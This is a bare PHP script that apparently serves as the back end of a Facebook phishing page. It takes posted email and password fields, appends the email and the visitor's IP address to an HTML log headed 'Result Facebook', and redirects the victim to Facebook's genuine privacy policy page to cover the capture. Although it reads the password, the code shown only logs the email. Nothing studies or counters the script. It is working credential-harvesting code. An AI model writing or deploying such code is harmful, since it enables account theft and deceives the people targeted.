<?php 

if(isset($_POST['suk']) || isset($_POST['uar'])) {
    $email = $_POST['suk'];
    $pass  = $_POST['uar'];
    $ip    = $_SERVER['REMOTE_ADDR'];

    $file = "kesambet1122.html";
        
    $handle = fopen($file, 'a');
    fwrite($handle, "==============================");
    fwrite($handle, "<br>");
    fwrite($handle, "Result Facebook");
    fwrite($handle, "<br>");
    fwrite($handle, "<br>");
    fwrite($handle, "Generator: ");
    fwrite($handle, "$email");
    fwrite($handle, "<br>");
    fwrite($handle, "IP Address : ");
    fwrite($handle, "$ip");
    fwrite($handle, "<br>");
    fwrite($handle, "==============================");
    fwrite($handle, "<br>");
    fwrite($handle, "<br>");
    fclose($handle);

    header('location: https://www.facebook.com/privacy/policy/');
}

?>